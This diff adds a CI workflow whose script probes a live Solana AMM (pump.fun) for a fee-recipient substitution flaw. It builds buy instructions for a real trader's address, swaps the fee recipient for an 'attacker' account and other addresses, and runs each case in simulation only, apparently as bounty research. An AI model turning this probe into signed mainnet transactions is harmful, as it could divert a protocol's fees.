@@ -1,0 +1,58 @@
+name: mayhem-fee-domain-runtime
+on:
+  push:
+    branches: [audit/boost-runtime-probe-20260815]
+    paths: ['.github/workflows/mayhem-fee-domain-runtime.yml']
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+        with: {ref: audit/boost-runtime-probe-20260815}
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js @solana/spl-token bn.js
+      - shell: bash
+        run: |
+          cat > mayhem_fee.mjs <<'NODE'
+          import BN from 'bn.js';
+          import {Connection,PublicKey,Transaction,TransactionInstruction,ComputeBudgetProgram,SystemProgram} from '@solana/web3.js';
+          import {AccountLayout,getAssociatedTokenAddressSync,createAssociatedTokenAccountIdempotentInstruction,createSyncNativeInstruction,TOKEN_PROGRAM_ID} from '@solana/spl-token';
+          import {OnlinePumpAmmSdk,PUMP_AMM_SDK,pumpAmmJson} from '@pump-fun/pump-swap-sdk';
+          const PROGRAM=new PublicKey('pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA');
+          const POOL=new PublicKey('3EUUwdSpEXap46NB6n5Mmt3U8XM8vW8HPCLtJDoGzw33');
+          const RPCS=['https://rpc.solanatracker.io/public','https://api.mainnet-beta.solana.com','https://solana-rpc.publicnode.com'];let rid=1;const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+          async function raw(u,m,p,n=4){let e;for(let a=0;a<n;a++){try{const r=await fetch(u,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:rid++,method:m,params:p})});if(r.status===429||r.status>=500){e=Error('HTTP '+r.status);await sleep(300+450*a);continue}const x=await r.json();if(x.error){e=Error(JSON.stringify(x.error));if(/429|No response|Too many/i.test(String(e))){await sleep(300+450*a);continue}throw e}return x.result}catch(x){e=x;await sleep(200)}}throw e}
+          async function call(m,p){let e;for(const u of RPCS){try{const x=await raw(u,m,p);console.log('RPC_OK',m,u);return x}catch(x){e=x;console.log('RPC_FAIL',m,u,String(x).slice(0,180))}}throw e}
+          function clone(ix,keys=ix.keys){return new TransactionInstruction({programId:ix.programId,data:Buffer.from(ix.data),keys:keys.map(k=>({...k}))})}
+          function tokenAmount(a){if(!a)return null;const b=Buffer.from(a.data[0],'base64');if(b.length<72)return null;try{return AccountLayout.decode(b).amount.toString()}catch{return null}}
+          // Select a real recent on-curve, funded trader of this exact pool.
+          const sigs=await call('getSignaturesForAddress',[POOL.toBase58(),{limit:40,commitment:'confirmed'}]);const candidates=[];
+          for(const s of sigs){if(s.err)continue;let tx=null;for(const u of RPCS){try{tx=await raw(u,'getTransaction',[s.signature,{encoding:'jsonParsed',commitment:'confirmed',maxSupportedTransactionVersion:0}],2);if(tx)break}catch{}}if(!tx)continue;const logs=tx.meta?.logMessages??[];if(!logs.some(l=>l.includes('Instruction: Buy')||l.includes('Instruction: Sell')))continue;for(const k of tx.transaction.message.accountKeys??[]){if(!k.signer)continue;try{const p=new PublicKey(k.pubkey);if(!PublicKey.isOnCurve(p.toBytes()))continue;candidates.push(k.pubkey)}catch{}}
+          }
+          const uniq=[...new Set(candidates)];if(!uniq.length)throw Error('no recent trader candidate');const infos=(await call('getMultipleAccounts',[uniq,{encoding:'base64',commitment:'confirmed'}])).value;let USER=null;for(let i=0;i<uniq.length;i++){const a=infos[i];if(a?.owner===SystemProgram.programId.toBase58()&&(a.lamports??0)>100_000_000){USER=new PublicKey(uniq[i]);console.log('SELECTED_USER',JSON.stringify({user:uniq[i],lamports:a.lamports,sol:a.lamports/1e9}));break}}if(!USER)throw Error('no funded recent system trader');
+          let conn=null;for(const u of RPCS){try{const c=new Connection(u,'confirmed');await c.getLatestBlockhash('confirmed');conn=c;console.log('SDK_RPC',u);break}catch(e){console.log('SDK_RPC_FAIL',u,String(e).slice(0,150))}}if(!conn)throw Error('no SDK RPC');
+          const sdk=new OnlinePumpAmmSdk(conn);const state=await sdk.swapSolanaState(POOL,USER);
+          const reserved=(state.globalConfig?.reservedFeeRecipients??[]).map(x=>x.toBase58());const normal=(state.globalConfig?.feeRecipients??[]).map(x=>x.toBase58());
+          console.log('STATE',JSON.stringify({pool:POOL.toBase58(),user:USER.toBase58(),isMayhemMode:state.pool.isMayhemMode,isCashbackCoin:state.pool.isCashbackCoin,baseMint:state.pool.baseMint.toBase58(),quoteMint:state.pool.quoteMint.toBase58(),baseProgram:state.baseTokenProgram.toBase58(),quoteProgram:state.quoteTokenProgram.toBase58(),coinCreator:state.pool.coinCreator.toBase58(),reserved,normal},null,2));
+          const userBase=getAssociatedTokenAddressSync(state.pool.baseMint,USER,false,state.baseTokenProgram);const userQuote=getAssociatedTokenAddressSync(state.pool.quoteMint,USER,false,state.quoteTokenProgram);
+          // Build a tiny canonical buy and preserve any SDK pre-fix instruction (e.g. extendAccount for 245-byte pool).
+          const built=await PUMP_AMM_SDK.buyQuoteInput(state,new BN('1000000'),5);
+          const buyDef=pumpAmmJson.instructions.find(i=>i.name==='buy');if(!buyDef)throw Error('buy idl missing');const disc=Buffer.from(buyDef.discriminator);const buyIndex=built.findIndex(ix=>ix.programId.equals(PROGRAM)&&ix.data.length>=8&&Buffer.from(ix.data.subarray(0,8)).equals(disc));if(buyIndex<0)throw Error('buy instruction not found');const buy=built[buyIndex],K=buy.keys;
+          const reservedSet=new Set(reserved),normalSet=new Set(normal);let fi=K.findIndex(k=>reservedSet.has(k.pubkey.toBase58()));if(fi<0)throw Error('canonical reserved fee recipient not found in buy keys');const ai=fi+1;if(ai>=K.length)throw Error('fee ATA missing');const canonical=K[fi].pubkey,canonicalAta=K[ai].pubkey;const expectedCanonicalAta=getAssociatedTokenAddressSync(state.pool.quoteMint,canonical,true,state.quoteTokenProgram);if(!canonicalAta.equals(expectedCanonicalAta))throw Error('fee recipient adjacency assumption wrong');
+          const altReserved=new PublicKey(reserved.find(x=>x!==canonical.toBase58()));const normalRecipient=new PublicKey(normal[0]);const attacker=USER;
+          const ata=r=>getAssociatedTokenAddressSync(state.pool.quoteMint,r,true,state.quoteTokenProgram);const altReservedAta=ata(altReserved),normalAta=ata(normalRecipient),attackerAta=ata(attacker);
+          console.log('BUY_META',JSON.stringify({builtCount:built.length,buyIndex,keyCount:K.length,fi,ai,canonical:canonical.toBase58(),canonicalAta:canonicalAta.toBase58(),canonicalIsReserved:reservedSet.has(canonical.toBase58()),canonicalIsNormal:normalSet.has(canonical.toBase58()),altReserved:altReserved.toBase58(),altReservedAta:altReservedAta.toBase58(),normalRecipient:normalRecipient.toBase58(),normalAta:normalAta.toBase58(),attacker:attacker.toBase58(),attackerAta:attackerAta.toBase58(),keys:K.map((k,i)=>({i,p:k.pubkey.toBase58(),w:k.isWritable,s:k.isSigner}))},null,2));
+          const mutate=(r,a)=>clone(buy,K.map((k,i)=>i===fi?{...k,pubkey:r}:i===ai?{...k,pubkey:a}:k));
+          const cases={control:clone(buy),alt_reserved:mutate(altReserved,altReservedAta),normal_recipient:mutate(normalRecipient,normalAta),attacker_recipient:mutate(attacker,attackerAta),mismatch_canonical_attacker_ata:mutate(canonical,attackerAta)};
+          const bh=(await call('getLatestBlockhash',[{commitment:'confirmed'}])).value.blockhash;
+          const prefix=built.slice(0,buyIndex),suffix=built.slice(buyIndex+1);
+          async function simulate(name,ix,destAta,createDest){const setup=[createAssociatedTokenAccountIdempotentInstruction(USER,userBase,USER,state.pool.baseMint,state.baseTokenProgram),createAssociatedTokenAccountIdempotentInstruction(USER,userQuote,USER,state.pool.quoteMint,state.quoteTokenProgram)];if(createDest&&!destAta.equals(userQuote))setup.push(createAssociatedTokenAccountIdempotentInstruction(USER,destAta,name==='alt_reserved'?altReserved:name==='normal_recipient'?normalRecipient:attacker,state.pool.quoteMint,state.quoteTokenProgram));setup.push(SystemProgram.transfer({fromPubkey:USER,toPubkey:userQuote,lamports:20_000_000}),createSyncNativeInstruction(userQuote,TOKEN_PROGRAM_ID));const tx=new Transaction({feePayer:USER,recentBlockhash:bh}).add(ComputeBudgetProgram.setComputeUnitLimit({units:1_400_000}),...setup,...prefix,ix,...suffix);let bytes;try{bytes=tx.serialize({requireAllSignatures:false,verifySignatures:false})}catch(e){console.log('SERIALIZE_FAIL',name,String(e));return {serializeError:String(e)}}const watch=[state.pool.poolBaseTokenAccount,state.pool.poolQuoteTokenAccount,userBase,userQuote,canonicalAta,destAta];let v=null,simRpc=null;for(const u of RPCS){try{const x=await raw(u,'simulateTransaction',[bytes.toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'confirmed',accounts:{encoding:'base64',addresses:watch.map(x=>x.toBase58())}}],3);v=x.value;simRpc=u;break}catch(e){console.log('SIM_FAIL',name,u,String(e).slice(0,200))}}if(!v)return {rpcError:'all sim failed'};const logs=v.logs??[],acs=v.accounts??[];const out={simRpc,bytes:bytes.length,err:v.err,units:v.unitsConsumed,amounts:{poolBase:tokenAmount(acs[0]),poolQuote:tokenAmount(acs[1]),userBase:tokenAmount(acs[2]),userQuote:tokenAmount(acs[3]),canonicalFee:tokenAmount(acs[4]),destFee:tokenAmount(acs[5])},instructions:logs.filter(l=>l.includes('Instruction:')),anchor:logs.filter(l=>l.includes('AnchorError')||l.includes('Error Code:')||l.includes('Error Number:')),failed:logs.filter(l=>l.includes('failed:'))};console.log('CASE',name,JSON.stringify(out,null,2));if(v.err)for(const l of logs)console.log('ERRLOG',name,l);return out}
+          const out={};out.control=await simulate('control',cases.control,canonicalAta,false);out.alt_reserved=await simulate('alt_reserved',cases.alt_reserved,altReservedAta,true);out.normal_recipient=await simulate('normal_recipient',cases.normal_recipient,normalAta,true);out.attacker_recipient=await simulate('attacker_recipient',cases.attacker_recipient,attackerAta,false);out.mismatch=await simulate('mismatch_canonical_attacker_ata',cases.mismatch_canonical_attacker_ata,attackerAta,false);
+          console.log('DECISIVE',JSON.stringify(Object.fromEntries(Object.entries(out).map(([n,x])=>[n,{err:x.err??x.rpcError??x.serializeError??null,amounts:x.amounts??null,anchor:x.anchor??[],failed:x.failed??[]}])) ,null,2));
+          NODE
+          node mayhem_fee.mjs
